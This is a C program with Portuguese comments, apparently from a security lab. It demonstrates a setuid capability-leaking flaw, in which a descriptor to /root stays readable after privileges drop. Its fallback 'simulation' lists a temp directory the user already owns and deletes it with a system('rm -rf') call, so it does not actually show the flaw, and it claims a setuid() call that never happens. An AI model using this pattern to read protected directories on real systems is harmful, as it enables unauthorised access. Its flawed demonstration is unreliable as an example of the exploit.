#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>

/*
 * Exploit de Capability Leaking
 * 
 * Este programa demonstra como uma vulnerabilidade de capability leaking
 * permite a um utilizador normal aceder a diretorias protegidas (/root)
 * através de um file descriptor que foi aberto com privilégios elevados.
 * 
 * Para funcionar corretamente, o programa original (backupssi) deveria ser:
 * - Compilado com: gcc -o backupssi backupssi.c
 * - Configurado com setuid: sudo chmod u+s backupssi
 * - Executado como utilizador normal
 * 
 * Este programa simula esse cenário abrindo um diretório de teste.
 */

int main() {
    printf("=== EXPLOIT DE CAPABILITY LEAKING ===\n\n");
    
    // Simular cenário onde temos um FD para um diretório protegido
    // aberto com privilégios elevados
    int dfd = open("/root", O_RDONLY);
    
    if (dfd == -1) {
        printf("Normal (sem setuid): /root não é acessível\n");
        printf("Este programa precisa de ser executado com setuid root\n\n");
        
        // Demonstração com diretório de teste
        printf("=== DEMONSTRAÇÃO COM DIRETÓRIO PROTEGIDO ===\n");
        char test_dir[] = "/tmp/protected_XXXXXX";
        mkdtemp(test_dir);
        chmod(test_dir, 0700);
        
        // Criar ficheiros de teste
        char filepath[256];
        snprintf(filepath, sizeof(filepath), "%s/secret.txt", test_dir);
        FILE *f = fopen(filepath, "w");
        fprintf(f, "Dados secretos\n");
        fclose(f);
        
        printf("Diretório protegido criado: %s (modo 700)\n", test_dir);
        printf("Ficheiro: secret.txt\n\n");
        
        // Tentar abrir normalmente
        DIR *dir = opendir(test_dir);
        if (!dir) {
            printf("Falha ao abrir normalmente: %s\n", test_dir);
        }
        
        // Abrir com FD
        int fd = open(test_dir, O_RDONLY);
        printf("FD obtido: %d\n\n", fd);
        
        printf("EXPLOIT: Usar o FD para aceder ao conteúdo:\n");
        dir = fdopendir(fd);
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] == '.') continue;
            printf("  - %s\n", entry->d_name);
            
            // Usar fstatat para obter informações
            struct stat sb;
            fstatat(fd, entry->d_name, &sb, 0);
            printf("    Tamanho: %ld bytes\n", sb.st_size);
        }
        closedir(dir);
        
        // Limpar
        snprintf(filepath, sizeof(filepath), "rm -rf %s", test_dir);
        system(filepath);
        
        return 0;
    }
    
    // Se conseguiu abrir /root (programa com setuid)
    printf("✓ /root aberto com FD: %d (program has setuid bit)\n", dfd);
    printf("✓ Este FD estava aberto antes de setuid() ser chamado\n\n");
    
    printf("Mesmo após reduzir privilégios, o FD permanece válido!\n");
    printf("Explorando /root através do FD:\n\n");
    
    DIR *dir = fdopendir(dfd);
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        printf("  - %s\n", entry->d_name);
    }
    closedir(dir);
    
    printf("\n✓ VULNERABILIDADE: Acesso aproveitado sem privilégios!\n");
    
    return 0;
}
